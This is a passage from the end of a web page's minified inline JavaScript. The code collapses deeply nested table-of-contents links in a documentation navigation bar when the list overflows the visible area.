if(s===e)return!0;while(s=s.parentNode)return!1}function clearActiveStatesInTableOfContents(){document.querySelectorAll("nav li").forEach(e=>{e.classList.remove("active")})}function getDepth(e){for(var t=0;e!==null&&e.tagName.toLowerCase()!=="ul";)t++,e=e.parentElement;return t}function navItems(){var e=document.querySelectorAll("nav nav li a");return Array.from(e).filter(e=>e.href!=null&&e.hash.startsWith("#"))}function lasItemInNavBarVisible(){var e=navItems().slice(-1)[0];return isVisible(e)}document.addEventListener("DOMContentLoaded",function(){if(!enableTruncate)return;var e=navItems();console.log(e),lasItemInNavBarVisible()||(filterDepth=!0,e.forEach(function(e){var t=getDepth(e.parentElement);t>MAX_DEPTH&&e.parentElement.classList.add("depth-nested")}))})</script></body></html>
